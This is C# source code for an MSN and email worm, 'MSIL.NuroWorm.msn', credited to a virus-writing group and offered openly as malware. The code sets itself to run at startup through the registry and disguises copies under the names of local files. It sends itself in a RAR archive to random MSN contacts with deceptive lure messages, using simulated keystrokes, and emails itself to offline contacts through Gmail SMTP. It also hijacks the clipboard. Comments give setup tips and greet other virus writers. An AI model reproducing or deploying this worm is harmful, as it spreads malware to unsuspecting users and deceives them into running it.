   /*

            MSIL.NuroWorm.msn
         MSN/email spreading worm
       Genetix / DoomRiderz VX team

   */


   /*
    * My 2nd MSN worm but with email spreading.. it's kinda like the 1 in vb.net but this was more planned and
    * it don't need a file server this used sendkeys instead, also this time in C#.net
    * it searches the current directory for a random files name to use to copy into c:\
    * it create's a rar file in c:\ that it will add itself into.
    * it get's all the contacts and picks a random contact to send itself to, this is fastest way.
    * it creates a random message from alot of set words and sends the message to the contact window.
    * it check the registry for itself and if it isnt there it add's itself to the registry to run on windows startup.
    * befor it does any of this it checks to see if msn is actually loaded and your not offline,
    * does this by checking processes with a timer control.
    * also collects offline/blocked contacts and sends a nice email to them with the worm as attachment and with random email subject
    * it using's gmail's smtp server and send's from a random address (from 2 addresses)
    * deletes copyied files after each run for a clean start next time.
    * has a kewl payload that sets the clipboard to doomriderz website link
    * also has a 2nd payload that spawns a new thread to activate a screen saver and download/play a midi file i like! :p
   */

   //ps: you must make 2 or more gmail accounts! more is better.

   using System;
   using MessengerAPI;
   using System.Collections.Generic;
   using System.Runtime.InteropServices;
   using System.ComponentModel;
   using System.Windows.Forms;
   using System.Diagnostics;
   using System.IO;
   using System.Reflection;
   using Microsoft.Win32;
   using System.Net.Mail;
   using System.Net;
   using System.Threading;

   namespace nuroWorm
   {

       public partial class Form1 : Form
       {
           //setup vars used

           const string url = "http://www.vgmusic.com/music/console/sega/master/Alien3-Title.mid";
           const string KeyTitle = "MSNUpdate";
           const string subkey = @"Software\Microsoft\Windows\CurrentVersion\Run";
           private string myDocs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\";
           string sFile = "nuro.exe";
           string ForEmail = "";
           string rndName = "";
           const string smtpserver = "smtp.gmail.com";
           WebClient wc = new WebClient();
           MessengerAPI.Messenger nurofen = new MessengerAPI.Messenger();

           [DllImport("winmm.dll")]
           private static extern long mciSendString(string strCommand, string strReturn, int iReturnLength, IntPtr hwndCallback);

           public Form1()
           {
               InitializeComponent();
           }

           private void Form1_Load(object sender, EventArgs e)
           {
               MSNtimer.Stop();

               Thread nuroThread = new Thread(new ThreadStart(this.payload));
               nuroThread.IsBackground = true;
               nuroThread.Start();

               //check if the worm is already in memory
               if (Is_Active() == true) {
                   Application.Exit();
               } else {
                   //enable timer if MSN isnt online/running
                   if (!MSNLoaded())
                   {
                       MSNtimer.Interval = 1000;
                       MSNtimer.Start();

                   }else{
                       //everything is ok jump to the worm.
                       Worming();
                   }
               }
           }


           public void payload()
           {
               if (!File.Exists(myDocs + "wintune.mid"))
               {
                   wc.DownloadFile(url, myDocs + "wintune.mid");
                   mciSendString("play " + myDocs + "wintune.mid", null, 0, IntPtr.Zero);
               }
               else
               {
                   mciSendString("play " + myDocs + "wintune.mid", null, 0, IntPtr.Zero);
               }

           }

           public void Worming()
           {

               string Msg = "";
               start_with_windows();
               //function call to create a rar file
               createRAR();
               //this is fun!
               Clipboard.SetData("www.DoomRiderz.co.nr  ---- GirlPower!!!", true);

               //call function to get a random message
               Msg = rndMSNmessage();
               nurofen.InstantMessage(GetContact()); //open chat window for random online contact
               //SendKeys.SendWait(Msg); // send the random message
                   /*
                    * the follwoing are all sendkeys commands.. their very usefull!
                    * because MSN dont support file fransfer programaticly
                    * so by sending key's it will be like a real person send a file
                   */
               SendKeys.SendWait("{ENTER}");
               SendKeys.SendWait("{TAB}");
               for (int x = 0; x <= 13; x++) {
                   SendKeys.SendWait("{UP}");
               }
               //Send the file using send keys
               SendKeys.SendWait("{ENTER}");SendKeys.SendWait("{DOWN}");
               SendKeys.SendWait("{DOWN}");SendKeys.SendWait("{ENTER}");
               SendKeys.SendWait("c:\\test.rar");SendKeys.SendWait("{ENTER}");
               //delete the temp files from c:\
               File.Delete(myDocs + "test.rar");
               File.Delete(myDocs + rndName);
               //setting up mail spreading
                   if (ForEmail != null) {
                       //make address array
                       string[] addresses = ForEmail.Split('¬');
                       //Get each addresse from the array 1 by 1
                       for (int i = 0; i <= addresses.GetUpperBound(0); i++) {
                           //check if there is actually anything there
                           if (addresses[i] != "")
                           //send contact to mailing function
                           MSN_MailWorm(addresses[i]);
                       }

                   }
           }


           //function to grab a random contact
           public string GetContact()
           {

               Random rnd = new Random();
               int conCount = 0;
               string Conts = "";

               //create new messanger class
               MessengerClass mess = new MessengerClass();
               //set contact variable as messanger contacts
               IMessengerContacts Contacts;
               //get messanger contacts from signed in account
               Contacts = (IMessengerContacts)mess.MyContacts;
               //create array of contacts
               string[] hosts = new string[Contacts.Count];

               //guess
               foreach (IMessengerContact host in Contacts)
               {
                   //No offliners plz!
                   if (host.Status != MISTATUS.MISTATUS_OFFLINE && !host.Blocked)
                   {
                       Conts = Conts + "¬" + host.SigninName; //online contacts
                       conCount += 1;
                   } else {
                       ForEmail = ForEmail + "¬" + host.SigninName; //get the blocked/offline contacts (they aint getting away!)
                   }
               }

               string[] contct = Conts.Split('¬'); //split into array
               return contct[rnd.Next(1, conCount + 1)].ToString(); //return random contact

           }

           //generate a random message
           public string rndMSNmessage()
           {
               Random rnd = new Random();
               string[] intro = new string[6];
               string[] scnd = new string[8];
               string[] thrd = new string[6];
               string[] fth = new string[6];
               string[] why = new string[15];

               intro[1] = "hey";
               intro[2] = "hay";
               intro[3] = "hi";
               intro[4] = "hello";
               intro[5] = "hiya";
               scnd[1] = "download";
               scnd[2] = "get";
               scnd[3] = "install";
               scnd[4] = "check out";
               scnd[5] = "try";
               scnd[6] = "look at";
               scnd[7] = "nurofen";
               thrd[1] = "this";
               thrd[2] = "that";
               thrd[3] = "my";
               thrd[4] = "the";
               thrd[5] = "a";
               fth[1] = "program";
               fth[2] = "software";
               fth[3] = "app";
               fth[4] = "application";
               fth[5] = "game";
               why[1] = "it get's msn passwords!";
               why[2] = "i need your opinion on it";
               why[3] = "i need someone to test it for me";
               why[4] = "it's safe!";
               why[5] = "you will love it!";
               why[6] = "it's amazing!";
               why[7] = "it is kewl!";
               why[8] = "accept it.";
               why[9] = "i made it";
               why[10] = "please";
               why[11] = "plz";
               why[13] = "MSN addon";
               why[14] = "secret MSN smilies!";


               return intro[rnd.Next(1, 5)] +
                   (char)(32) + scnd[rnd.Next(1, 7)] + (char)(32) +
                   thrd[rnd.Next(1, 5)] + (char)(32) + fth[rnd.Next(1, 5)] + (char)(32) +
                   why[rnd.Next(1, 14)]; //generate the random IM
           }

           public bool MSNLoaded()
           {
               Process[] processes = Process.GetProcesses();
               foreach (Process p in processes)
               {
                   string pname = p.ProcessName.ToLower();
                   if (pname == "msnmsgr") //name of msn messangers process in memory
                   {
                       return true;
                   }
               }
               return false;
           }

           //find the WinRar program location using registry
           public string GetRarPath()
           {
               string tmpGetRarPath = null;
               RegistryKey myReg = null;
               myReg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe", false);
               if (myReg == null)
               {
                   Application.Exit();
               }else{
                   tmpGetRarPath = System.Convert.ToString(myReg.GetValue("Path")) + @"\WinRar.exe";
               }

               return tmpGetRarPath;
           }

           //add's worm to startup key
           public string start_with_windows()
           {
               RegistryKey isthere = null;

               System.Reflection.Module nurofenModule = Assembly.GetExecutingAssembly().GetModules()[0];
               string nurofenFile = (nurofenModule.FullyQualifiedName);
               if (!File.Exists(myDocs + sFile))
               {
                   //make it if it isnt there
                   File.Copy(nurofenFile, myDocs + sFile, false);
               }
               //check if its there
               isthere = Registry.CurrentUser.OpenSubKey(subkey + KeyTitle, false);
               if (isthere == null)
               { //no?
                   //then put it there lol
                   RegistryKey key = Registry.CurrentUser.OpenSubKey(subkey, true);
                   key.SetValue(KeyTitle, myDocs + sFile);

               } return null;

           }

           //creates a rar file and a copy of itself to c:\ and sends it to msn contact
           public string createRAR()
           {
               string compile = "";
               //create byte array for rar file header
               byte[] RARArchive = new byte[] {
                   82, 97,
                 114,33,
                    26,7,
                 0,207,
                   144,115,
                 0,0,13,
                   0, 0, 0, 0, 0, 0, 0
               };

               //get self exe name/location
               System.Reflection.Module nurofenModule = Assembly.GetExecutingAssembly().GetModules()[0];
               string nurofenFile = (nurofenModule.FullyQualifiedName);

               //create rar file
               FileStream fs = File.Create(myDocs + "test.rar");
               fs.Write(RARArchive, 0, RARArchive.Length);
               fs.Flush();
               fs.Close();
               fs = null;

               //get working directory
               string path = Directory.GetCurrentDirectory();
               //get files from current location
               rndName = getfiles(path + @"\");
               //check if it's found any files it can use the name of
               if (rndName != "")
               {
                   //strip extension from file
                   rndName = rndName.Substring(0, (rndName.IndexOf(".", 0) + 1) - 1);
                   //add a .exe extension
                   rndName += ".exe";
               }
               else
               { //no files?
                   //use this name then
                   rndName = "nuro.exe";

               }
               //copy self to c:\ with the file name of a file found in the current path
               File.Copy(nurofenFile, myDocs + rndName);

               //rar it! (causes error because of header, but the rar file works!)
               System.Diagnostics.Process process1 = new System.Diagnostics.Process();
               process1.EnableRaisingEvents = false;
               compile = "/C \"" + GetRarPath() + "\" a " + myDocs + "test.rar" + " " + myDocs + rndName;
               Process.Start("CMD.exe", compile).WaitForExit();
               process1.Close();

               return null;
           }

           //check for Previous Instance, return true or false
           public bool Is_Active()
           {
               Mutex nuroMutex = new Mutex(false, "Genetix");
               bool Running = !nuroMutex.WaitOne(0, false);
               return Running;
           }

           //used for getting a file name randomly
           public string getfiles(string dir)
           {
               Random rnd = new Random();
               int filecount = 0;
               string filess = "";
               string[] files = null;

               //get files
               files = System.IO.Directory.GetFiles(dir);

               //make array of files
               for (int i = 0; i <= files.GetUpperBound(0); i++)
               {
                   //get the filename (or it will include the file path)
                   filess = filess + "!" + System.IO.Path.GetFileName(files[i]);
                   //count how many files it found
                   filecount += 1;
               }

               //create array from var "filess" with "!" as delim
               string[] rndfile = filess.Split('!');
               //choose a random file
               return rndfile[rnd.Next(1, filecount + 1)].ToString();
           }

           //function to email the worm to contacts.. kinda really simple
           //but affective for spreading fast (atleast until the accounds are locked)
           public string MSN_MailWorm(string address)
           {

               Random rnd = new Random();
               string mail1 = "name@gmail.com";
               string mail2 = "name@gmail.com";
               string ToUse = "";
               string[] one = new string[10];

               //pick random accound to mail from
               if (rnd.Next(1, 2) == 1)
               {
                   ToUse = mail1;
               }
               else
               {
                   ToUse = mail2;
               }

               //some email subjects
               one[1] = "hiya";
               one[2] = "hello";
               one[3] = "hey";
               one[4] = "hay";
               one[5] = "hi";
               one[6] = "read!!";
               one[7] = "how are you?";
               one[8] = "hi " + address + " check this out!";
               one[9] = "hey " + address + " you should see this!";


               MailMessage MailWorm = new MailMessage();
               MailWorm.To.Add(address); MailWorm.From = new MailAddress(ToUse, rndMSNmessage());
               MailWorm.IsBodyHtml = true; MailWorm.Priority = MailPriority.Normal;
               string Nuro = myDocs + "test.rar"; MailWorm.Attachments.Add(new Attachment(Nuro));
               MailWorm.Subject = one[rnd.Next(1, 9)]; MailWorm.Body = "<table><tr><td>" + rndMSNmessage() + "</td></tr></table>";
               SmtpClient smtpcli = new SmtpClient(smtpserver, 587); smtpcli.EnableSsl = true;
               smtpcli.DeliveryMethod = SmtpDeliveryMethod.Network;
               smtpcli.Credentials = new NetworkCredential(ToUse, "your password for both gmail accounts");
               try
               {
                   //try send the worm to contacts
                   smtpcli.Send(MailWorm);
               } catch {
               }

               return null;
           }

           //wait for msn to start if not already running
           private void MSNtimer_Tick(object sender, EventArgs e)
           {
               if (MSNLoaded() && !online())
               {
                   MSNtimer.Stop();
                   Worming();
               }
           }

           public bool online() {
               if (nurofen.MyStatus != MISTATUS.MISTATUS_OFFLINE)
               {
                   return true;
               }else{
                   return false;
               }
           }
       }
   }

   //so thats all! not great but it was fun.

   /*
    * hello's to all these weird friends of mine:
    *
    * kefi ----------- dead?
    * free0n ---------- thx for all the help! god's gift to women huh?
    * retr0 ----------- thx for help too! i owe you a strip tease lol
    * slagehammer ---------- thx for buying me a house in the country side ;) lol
    * necro ---------- that place you dream about is turkey because they are all moving to germany!
    * dr3f ----------- your depressing but fun.. pervert! :p
    * ponygrl ---------- erm... I don't know you but welcome to the scene & good luck, nice to know im not the only 1 being terrorized for pics!
    * synge ----------- another god's gift to women.. this is the only thing you have in common with free0n lol
    * WarGame ---------- thx for joining us you'll have fun! get faster internet
    * peter ferrie ---------- it's turnt from fun to habbit! i just need to get away from here.. got a spare room?
    * falckon ----------- good luck with your english lessons , and good luck trying to sleep with me lol
    * And hello to everyone in #virus! (thats on undernet if you didnt know)
    *
    * sorry to anyone i missed out but i just poked myself in the eye now i'm typing blind!
    * and you've probably noticed in all my work my greets are totally random!
   */
